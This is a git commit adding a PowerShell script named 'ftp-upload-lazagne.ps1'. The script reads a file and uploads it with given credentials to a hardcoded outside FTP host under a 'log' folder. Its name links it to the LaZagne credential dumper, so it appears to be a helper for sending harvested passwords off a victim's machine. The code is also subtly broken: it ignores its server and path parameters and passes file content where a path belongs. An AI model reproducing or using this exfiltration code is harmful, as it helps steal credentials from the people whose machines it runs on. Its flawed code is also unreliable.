82fc3819de2ded16ed3d46347b4c2eff1ee2f741
LittleZiG <fgtbg@yahoo.fr>
2024-01-09 16:08:16 +0100

    Add files via upload

---
+++ ftp-upload-lazagne.ps1
@@ -0,0 +1,30 @@
+function ftp-upload {
+    param (
+        [string]$ftpServer,
+        [string]$remotePath,
+        [string]$ftpUsername,
+        [string]$ftpPassword,
+        [string]$fileupload
+    )
+
+    try {
+        $outputFile = Split-Path $fileupload -leaf
+    
+		$fileContent = Get-Content -Path $fileupload -Raw -Encoding UTF8
+	
+        $webClient = New-Object System.Net.WebClient
+        $webClient.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
+        
+        $webClient.UploadFile("ftp://ftp.zigflip.fun/log/" + $outputFile, $fileContent = Get-Content -Path $fileupload -Raw -Encoding UTF8)
+
+        Write-Host "Le fichier a été uploadé avec succès."
+    }
+    catch {
+        Write-Host "Chemin de fileupload : $fileupload"
+        Write-Host "outpufile  : $outputFile"
+        Write-Host "Erreur lors de l'upload du fichier : $_.Exception.Message"
+    }
+    finally {
+        $webClient.Dispose()
+    }
+}
